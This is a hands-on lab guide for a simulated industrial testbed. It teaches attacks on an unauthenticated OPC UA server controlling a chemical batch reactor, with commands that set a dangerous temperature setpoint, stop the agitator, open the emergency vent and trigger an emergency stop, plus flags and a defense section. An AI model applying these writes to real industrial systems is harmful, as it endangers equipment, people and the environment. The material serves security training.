# Lab 5: OPC UA Industrial Process Attack

## Overview
| Property | Value |
|----------|-------|
| Duration | 90 minutes |
| Difficulty | Advanced |
| Protocol | OPC UA |
| Scenario | Chemical Batch Reactor |
| Attacker IP | 10.0.4.100 |

## Learning Objectives
By completing this lab, you will:
1. Understand OPC UA protocol architecture and security model
2. Discover and enumerate OPC UA servers
3. Browse server address space without authentication
4. Read process values and setpoints
5. Write to nodes and call methods to manipulate the batch process
6. Understand real-world OPC UA attack scenarios

## Background

### OPC UA Protocol
OPC UA (Unified Architecture) is the successor to OPC Classic, designed for secure, reliable data exchange in industrial environments.

**Key Features:**
- Platform-independent (runs on Linux, Windows, embedded)
- Built-in security model (authentication, encryption, signing)
- Rich information modeling
- Methods for remote procedure calls
- Binary and XML encoding options

**Security Modes:**
- None (No security - our target!)
- Sign (Message integrity only)
- SignAndEncrypt (Full security)

**Authentication Policies:**
- Anonymous (No authentication - our target!)
- Username/Password
- X.509 Certificates

### Target: Batch Reactor
The VULNOT batch reactor simulates a chemical process:
- Reactor vessel with temperature/pressure control
- Feed pumps for raw materials
- Agitator for mixing
- Heating/cooling jacket
- Safety interlocks

**Attack Surface:**
- OPC UA server on port 4840
- Anonymous access enabled
- All nodes readable
- Setpoint nodes writable
- Critical methods callable

## Part 1: OPC UA Fundamentals (20 min)

### Protocol Structure
```
┌─────────────────────────────────────┐
│           OPC UA Stack              │
├─────────────────────────────────────┤
│  Application Layer (Services)       │
├─────────────────────────────────────┤
│  Secure Channel Layer               │
├─────────────────────────────────────┤
│  Transport Layer (TCP/HTTPS)        │
└─────────────────────────────────────┘
```

### Address Space
OPC UA organizes data in a hierarchical address space:
- **Nodes**: Objects, Variables, Methods
- **References**: Relationships between nodes
- **Attributes**: Properties of nodes (NodeId, BrowseName, Value)

### Node Classes
| Class | Description |
|-------|-------------|
| Object | Container for other nodes |
| Variable | Holds a value (sensors, setpoints) |
| Method | Callable function on server |
| ObjectType | Template for objects |
| DataType | Defines data types |

## Part 2: OPC UA Reconnaissance (20 min)

### Task 2.1: Network Discovery
Access the attacker workstation:
```bash
docker exec -it vulnot-attacker-opcua bash
```

Scan for OPC UA servers:
```bash
vulnot-opcua scan -n 10.0.4.0/24
```

Expected output:
```
╔════════════════════════════════════════╗
║      VULNOT OPC UA Server Scanner      ║
╚════════════════════════════════════════╝

Discovered OPC UA Servers
┌────────────┬──────┬──────────────┐
│ IP Address │ Port │ OPC UA       │
├────────────┼──────┼──────────────┤
│ 10.0.4.10  │ 4840 │ Confirmed    │
└────────────┴──────┴──────────────┘
```

**🚩 FLAG: opcua_scan_complete**

### Task 2.2: Browse Address Space
Connect and browse the server:
```bash
vulnot-opcua browse -t 10.0.4.10
```

Observe the node structure:
- BatchReactor object
- Process variables (ReactorTemp, ReactorPressure, etc.)
- Setpoint nodes (TempSetpoint, PressureSetpoint)
- Control nodes (HeatingOn, CoolingOn, AgitatorRunning)
- Methods (StartBatch, StopBatch, EmergencyStop)

### Task 2.3: Identify Attack Vectors
Document writable nodes and callable methods:

| Node | Type | Attack Potential |
|------|------|------------------|
| TempSetpoint | Writable | Process manipulation |
| AgitatorRunning | Writable | Mixing disruption |
| EmergencyVentOpen | Writable | Pressure release |
| EmergencyStop | Method | Process halt |

## Part 3: Reading Process Data (15 min)

### Task 3.1: Monitor Live Values
```bash
# Read current values
vulnot-opcua browse -t 10.0.4.10
```

Key values to monitor:
- **ReactorTemp**: Current temperature (should be ~85°C)
- **ReactorPressure**: Current pressure (should be ~2.5 bar)
- **BatchProgress**: Batch completion percentage
- **Conversion**: Reaction conversion rate

### Task 3.2: Identify Normal Operating Ranges

| Parameter | Normal Range | Alarm Threshold |
|-----------|--------------|-----------------|
| Temperature | 80-90°C | >95°C |
| Pressure | 2.0-3.0 bar | >4.0 bar |
| Agitator Speed | 100-200 RPM | N/A |
| pH | 6.5-7.5 | <6 or >8 |

**🚩 FLAG: opcua_read_complete**

## Part 4: Process Manipulation Attacks (25 min)

### ⚠️ WARNING
These attacks can cause simulated process upsets. In a real environment, they could cause:
- Equipment damage
- Product loss
- Safety hazards
- Environmental releases

### Attack 4.1: Temperature Setpoint Manipulation
Increase temperature setpoint to dangerous level:
```bash
vulnot-opcua write -t 10.0.4.10 -n "ns=2;s=TempSetpoint" -v 150
```

**Expected Impact:**
- Heating valve opens 100%
- Temperature rises rapidly
- High temperature alarm triggers
- Potential runaway reaction simulation

### Attack 4.2: Disable Agitator
Stop the agitator during reaction:
```bash
vulnot-opcua write -t 10.0.4.10 -n "ns=2;s=AgitatorRunning" -v false
```

**Expected Impact:**
- Mixing stops
- Heat transfer becomes uneven
- Hot spots form
- Product quality degradation

### Attack 4.3: Open Emergency Vent
Force open the emergency vent:
```bash
vulnot-opcua write -t 10.0.4.10 -n "ns=2;s=EmergencyVentOpen" -v true
```

**Expected Impact:**
- Pressure drops rapidly
- Loss of containment
- Batch ruined
- Environmental release (simulated)

**🚩 FLAG: opcua_manipulation**

## Part 5: Method-Based Attacks (10 min)

### Attack 5.1: Emergency Stop
Call the EmergencyStop method:
```bash
vulnot-opcua method -t 10.0.4.10 -m estop
```

**This method:**
- Stops agitator
- Closes all feed valves
- Turns off heating
- Activates interlock

### Attack 5.2: Stop Batch
Prematurely end the batch:
```bash
vulnot-opcua method -t 10.0.4.10 -m stop
```

**🚩 FLAG: opcua_estop**

## Real-World Context

### TRITON/TRISIS (2017)
While not OPC UA specific, this attack on safety systems shows the potential:
- Targeted Triconex safety controllers
- Attempted to disable safety systems
- Could have caused physical damage
- First malware designed to attack safety systems

### OPC UA Security Gaps
Common vulnerabilities in real deployments:
- Anonymous access enabled for "convenience"
- Self-signed certificates accepted
- No network segmentation
- Insufficient logging

## Detection & Defense

### What Would IDS See?
```
[OPCUA-001] OPC UA Anonymous Access - 10.0.4.100 -> 10.0.4.10
[OPCUA-002] Critical Method Call: EmergencyStop - 10.0.4.100
[GENERIC-001] Value Anomaly: TempSetpoint = 150 (3.5σ from baseline)
```

### Defensive Measures
1. **Disable Anonymous Access**: Require authentication
2. **Use SignAndEncrypt**: Enable full security mode
3. **Certificate Management**: Use proper PKI
4. **Network Segmentation**: Isolate OPC UA servers
5. **Monitoring**: Log all connections and writes
6. **Method ACLs**: Restrict who can call critical methods

## Assessment Questions

1. What security mode does the target OPC UA server use?
2. Why is anonymous access dangerous in industrial environments?
3. What's the difference between writing to a node vs. calling a method?
4. How could an attacker use OPC UA browse functionality for reconnaissance?
5. What physical consequences could result from the temperature setpoint attack?

## Flags Summary
| Flag | Points | Description |
|------|--------|-------------|
| opcua_scan_complete | 10 | Discovered OPC UA server |
| opcua_read_complete | 15 | Read process values |
| opcua_manipulation | 25 | Modified setpoint |
| opcua_estop | 30 | Called emergency stop |

## Next Steps
- Proceed to Lab 6: BACnet Building Attack
- Try combining attacks for maximum impact
- Study OPC UA security specifications
